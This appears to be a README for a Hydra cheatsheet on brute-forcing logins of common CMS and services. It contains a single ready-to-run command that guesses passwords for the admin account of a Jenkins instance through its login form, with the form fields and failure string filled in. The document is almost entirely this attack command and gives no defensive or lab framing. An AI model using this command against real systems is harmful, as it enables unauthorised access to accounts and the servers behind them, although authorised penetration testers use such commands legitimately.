# hydra-cheatsheet
Hydra cheatsheet for common CMS &amp; Services

### Jenkins
```
sudo hydra -l admin -P [PASSWORD_FILE] [TARGET]
\ -s [PORT] http-post-form
\ "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"
\ -V
```
